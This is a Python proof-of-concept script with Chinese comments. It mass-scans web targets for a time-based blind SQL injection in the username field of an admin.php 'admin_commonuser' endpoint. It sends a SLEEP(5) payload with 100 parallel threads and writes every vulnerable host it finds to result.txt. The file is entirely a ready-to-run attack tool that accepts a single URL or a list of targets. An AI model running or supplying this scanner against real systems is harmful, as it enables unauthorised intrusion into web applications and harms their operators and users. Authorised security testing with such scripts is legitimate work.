import requests,argparse,sys,time,re
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """" 
 ██████╗ ██╗     ██████╗ ███████╗ ██████╗ ██╗     
██╔═══██╗██║     ██╔══██╗██╔════╝██╔═══██╗██║     
██║   ██║██║     ██████╔╝███████╗██║   ██║██║     
██║▄▄ ██║██║     ██╔══██╗╚════██║██║▄▄ ██║██║     
╚██████╔╝███████╗██████╔╝███████║╚██████╔╝███████╗
 ╚══▀▀═╝ ╚══════╝╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                                                                            
                                 version:1.0
    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/admin.php?controller=admin_commonuser"
    url = target+payload_url
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        "Connection": "keep-alive",
        "Content-Length": "76",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.elapsed.total_seconds() >=5 :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False
        
if __name__ == '__main__':
    main()